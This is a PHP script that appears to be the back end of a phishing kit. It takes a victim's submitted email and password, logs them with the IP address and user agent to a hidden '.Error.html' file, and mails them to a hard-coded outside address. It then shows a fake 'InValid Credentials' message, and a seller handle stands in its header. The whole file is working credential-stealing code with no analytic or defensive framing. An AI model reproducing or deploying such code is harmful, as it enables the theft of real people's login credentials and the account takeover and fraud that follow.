<?php
error_reporting(0);

$email = trim($_POST['email']);
$password = trim($_POST['password']);

//path where to save logs
$path = __DIR__.'/.Error.html';

function save_logs($message){
    global $path;
    return file_put_contents($path, $message . PHP_EOL , FILE_APPEND | LOCK_EX);
}



if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|------------------| 2021 icq=@seller001 |------------------|\n";
	$message .= "Email ID            : ".$email."\n";
	$message .= "Password              : ".$password."\n";
	$message .= "|------------------ INFO |  IP ------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "|User Agent : ".$useragent."\n";
	$message .= "|------------------------------------------------|\n";
	save_logs($message);
	$send = "vadim.drujna@gmail.com ";
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>